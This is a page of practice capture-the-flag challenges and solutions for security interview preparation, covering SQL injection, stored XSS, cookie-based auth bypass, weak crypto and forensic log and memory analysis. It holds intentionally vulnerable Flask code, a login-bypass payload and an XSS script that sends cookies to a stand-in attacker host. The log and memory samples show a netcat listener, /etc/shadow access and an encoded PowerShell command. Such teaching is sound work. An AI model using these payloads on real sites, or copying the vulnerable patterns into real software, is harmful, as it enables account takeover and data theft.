# 🏆 CTF Challenges

Practice challenges for cybersecurity interview preparation.

## 📋 Table of Contents

- [Web Security Challenges](#web-security-challenges)
- [Cryptography Challenges](#cryptography-challenges)
- [Forensics Challenges](#forensics-challenges)
- [Challenge Solutions](#challenge-solutions)

## 🌐 Web Security Challenges

### Challenge 1: SQL Injection

```python
# Challenge: Find the vulnerability and exploit it
# Goal: Extract the admin password hash

VULNERABLE_CODE = '''
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    result = db.execute(query)
    
    if result:
        return "Login successful!"
    return "Invalid credentials"
'''

# Challenge questions:
# 1. What is the vulnerability?
# 2. How would you exploit it?
# 3. How would you fix it?
# 4. What can you extract?

# Hint: Try username: admin' --
```

### Challenge 2: XSS

```python
# Challenge: Find stored XSS and steal cookies

VULNERABLE_CODE = '''
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    db.execute("INSERT INTO comments (text) VALUES (?)", (comment,))
    return redirect('/comments')

@app.route('/comments')
def show_comments():
    comments = db.execute("SELECT text FROM comments")
    return f"<html><body>{''.join(f'<p>{c[0]}</p>' for c in comments)}</body></html>"
'''

# Challenge questions:
# 1. What type of XSS is this?
# 2. Write a payload to steal session cookies
# 3. How would you fix this?
```

### Challenge 3: Authentication Bypass

```python
# Challenge: Bypass authentication

VULNERABLE_CODE = '''
@app.route('/admin')
def admin_panel():
    if request.cookies.get('role') == 'admin':
        return "Welcome, admin!"
    return "Access denied", 403
'''

# Challenge questions:
# 1. What is the vulnerability?
# 2. How would you exploit it?
# 3. How would you fix it?
```

## 🔐 Cryptography Challenges

### Challenge 1: Weak Encryption

```python
# Challenge: Decrypt the message

CIPHERTEXT = "Khoor Zruog!"
HINT = "This is a simple substitution cipher"

# Challenge: Write a program to decrypt this
# Answer: "Hello World!" (Caesar cipher, shift 3)

def caesar_decrypt(ciphertext, shift):
    result = []
    for char in ciphertext:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result.append(chr((ord(char) - base - shift) % 26 + base))
        else:
            result.append(char)
    return ''.join(result)
```

### Challenge 2: Hash Collision

```python
# Challenge: Find two strings with the same hash

def weak_hash(s):
    """Very weak hash function - find a collision"""
    h = 0
    for c in s:
        h = (h * 31 + ord(c)) % 10000
    return h

# Challenge: Find two different strings that produce the same hash
# This demonstrates why weak hash functions are dangerous

# Solution approach:
def find_collision():
    hashes = {}
    for i in range(10000):
        s = str(i)
        h = weak_hash(s)
        if h in hashes and hashes[h] != s:
            return hashes[h], s, h
        hashes[h] = s
    return None
```

## 🔍 Forensics Challenges

### Challenge 1: Log Analysis

```python
# Challenge: Analyze these logs and answer questions

LOGS = '''
2024-01-15 10:23:45 192.168.1.100 - admin LOGIN_SUCCESS
2024-01-15 10:24:12 192.168.1.100 - admin FILE_ACCESS /etc/passwd
2024-01-15 10:25:33 10.0.0.50 - admin LOGIN_FAILURE
2024-01-15 10:25:35 10.0.0.50 - admin LOGIN_FAILURE
2024-01-15 10:25:38 10.0.0.50 - admin LOGIN_FAILURE
2024-01-15 10:25:40 10.0.0.50 - admin LOGIN_SUCCESS
2024-01-15 10:26:15 10.0.0.50 - admin FILE_ACCESS /etc/shadow
2024-01-15 10:26:45 10.0.0.50 - admin PROCESS_START nc -l -p 4444
2024-01-15 10:27:00 192.168.1.100 - admin LOGOUT
'''

# Questions:
# 1. What type of attack occurred?
# 2. What was the attacker's IP?
# 3. What did the attacker access?
# 4. What command did they run?
# 5. What is suspicious about this?
```

### Challenge 2: Memory Analysis

```python
# Challenge: Analyze this memory dump excerpt

MEMORY_DUMP = '''
Process: svchost.exe (PID: 1234)
  Parent: explorer.exe (PID: 567)
  Command: C:\\Windows\\System32\\svchost.exe -k netsvcs
  
Process: svchost.exe (PID: 9876)
  Parent: chrome.exe (PID: 4444)
  Command: C:\\Users\\Admin\\AppData\\Local\\Temp\\svchost.exe
  
Process: powershell.exe (PID: 5555)
  Parent: svchost.exe (PID: 9876)
  Command: powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBq...
'''

# Questions:
# 1. What is suspicious?
# 2. What type of malware behavior is shown?
# 3. What should you investigate next?
```

## 💡 Challenge Solutions

### SQL Injection Solution

```python
# 1. Vulnerability: String concatenation in SQL query
# 2. Exploit: 
#    Username: admin' --
#    Password: anything
#    This comments out the password check
# 3. Fix:

def secure_login():
    username = request.form['username']
    password = request.form['password']
    
    # Use parameterized query
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    result = db.execute(query, (username, hash_password(password)))
    
    return result
```

### XSS Solution

```python
# 1. Type: Stored XSS (reflected in other users' browsers)
# 2. Payload:
PAYLOAD = '''
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
'''

# 3. Fix:
def secure_comment():
    from html import escape
    comment = escape(request.form['comment'])
    db.execute("INSERT INTO comments (text) VALUES (?)", (comment,))
    return redirect('/comments')

# Or use Content Security Policy
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

### Authentication Bypass Solution

```python
# 1. Vulnerability: Client-side authorization (cookie manipulation)
# 2. Exploit: Set cookie "role=admin" in browser
# 3. Fix:

# Use server-side session with proper authentication
from flask import session

@app.route('/admin')
def admin_panel():
    if session.get('role') == 'admin':  # Server-side check
        return "Welcome, admin!"
    return "Access denied", 403

# Store role in server-side session, not client cookie
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session['user_id'] = user.id
        session['role'] = user.role  # Server-side storage
        return "Login successful"
    return "Invalid credentials"
```

## 🎯 Practice Environment Setup

```yaml
# docker-compose.yml for practice lab
version: '3'
services:
  web-vulnerable:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
  
  sql-lab:
    image: acgpiano/sqli-labs
    ports:
      - "8081:80"
  
  xss-lab:
    image: capstoneengineering/xss-lab
    ports:
      - "8082:80"
```

## 📚 Additional Resources

- **OWASP Juice Shop**: Modern vulnerable web application
- **HackTheBox**: Real-world penetration testing challenges  
- **TryHackMe**: Guided cybersecurity learning
- **PortSwigger Web Security Academy**: Free web security training
- **PicoCTF**: Beginner-friendly CTF challenges